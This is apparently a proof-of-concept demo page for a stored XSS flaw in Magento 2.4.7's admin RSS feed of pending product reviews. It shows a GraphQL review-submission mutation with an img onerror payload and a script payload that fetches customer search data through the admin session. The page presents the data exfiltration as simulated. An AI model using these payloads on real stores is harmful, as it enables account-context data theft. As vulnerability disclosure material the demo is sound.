Magento Stored XSS — Admin RSS Feed Rendering Demo

This page simulates exactly what a Magento admin sees when viewing the pending reviews RSS feed. The HTML below is the exact output of Rss.php's getRssData() method — copied from our local Magento 2.4.7-p4 instance after submitting a review with an XSS payload.

Step 1: What the attacker submitted

mutation {
  createProductReview(input: {
    sku: "24-WB04"
    nickname: "attacker"
    summary: "<img src=x onerror=document.title='XSS_FIRED'>"
    text: "<script>fetch('/rest/V1/customers/search?searchCriteria[pageSize]=100').then(r=>r.json()).then(d=>{document.getElementById('stolen').textContent=JSON.stringify(d,null,2)})</script>"

Step 2: What Rss.php outputs (raw HTML)

Click the button below to render the RSS description as HTML — exactly as a browser or RSS reader would. The <img onerror> tag will fire and change the page title. The <script> tag will execute and simulate data exfiltration (displaying fake customer data below instead of sending it externally).
